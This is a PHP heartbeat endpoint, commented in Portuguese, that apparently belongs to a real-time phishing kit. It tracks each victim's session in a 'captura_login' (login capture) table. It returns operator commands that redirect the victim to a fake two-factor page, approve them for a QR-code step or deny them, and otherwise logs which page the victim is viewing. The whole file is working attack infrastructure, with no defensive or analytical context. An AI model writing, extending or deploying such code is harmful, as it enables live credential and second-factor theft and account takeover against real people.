<?php
header('Content-Type: application/json');
require_once __DIR__ . '/db.php';

// Identifica o usuário pelo cookie
$session_id = $_COOKIE['identificador_cliente'] ?? null;
if (!$session_id) {
    echo json_encode(['command' => null, 'error' => 'Sessão não encontrada.']);
    exit;
}

// Pega o status da localização atual do cliente
$data = json_decode(file_get_contents('php://input'), true);
$current_client_status = $data['status'] ?? null;

if (empty($current_client_status)) {
    echo json_encode(['command' => null, 'error' => 'Status da página do cliente não fornecido.']);
    exit;
}

try {
    // 1. PRIMEIRO, VAMOS LER o status atual no banco de dados
    $stmt_check = $pdo->prepare("SELECT status FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1");
    $stmt_check->execute([$session_id]);
    $current_db_status = $stmt_check->fetchColumn();

    // Lista de status que são "comandos do admin"
    $admin_commands = ['redirecionar_para_2fa', 'aprovado_para_qr', 'negado'];

    // 2. LÓGICA DE DECISÃO
    if ($current_db_status && in_array($current_db_status, $admin_commands)) {
        // SE HÁ UM COMANDO DO ADMIN PENDENTE, RETORNE-O IMEDIATAMENTE
        echo json_encode(['command' => $current_db_status]);
        exit;
    } else {
        // SE NÃO HÁ COMANDO, ATUALIZE A LOCALIZAÇÃO DO USUÁRIO
        $sql = "UPDATE captura_login SET status = ? WHERE id = (
                    SELECT id FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1
                )";
        $stmt_update = $pdo->prepare($sql);
        $stmt_update->execute([$current_client_status, $session_id]);

        // E responda que não há nenhum comando a ser executado
        echo json_encode(['command' => null]);
    }

} catch (PDOException $e) {
    error_log('Erro na API de heartbeat: ' . $e->getMessage());
    http_response_code(500);
    echo json_encode(['command' => null, 'error' => 'Erro interno do servidor.']);
}
?>